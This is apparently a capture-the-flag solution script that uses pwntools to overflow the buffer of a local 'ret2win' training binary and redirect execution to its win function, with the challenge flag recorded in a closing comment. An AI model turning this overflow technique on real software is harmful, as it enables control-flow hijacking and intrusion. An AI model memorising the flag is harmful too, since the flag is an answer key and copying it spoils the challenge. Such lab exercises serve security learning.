#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./ret2win', checksec=False)
p = process(exe.path)

p.recvuntil(b'> ');
p.sendline(b'x' * 40 + p64(exe.symbols['main'] + 36) + p64(exe.symbols['win'])) 

p.interactive(); 

# KCSC{592fc879-c2eb-45b7-bf15-2725f2a86338}
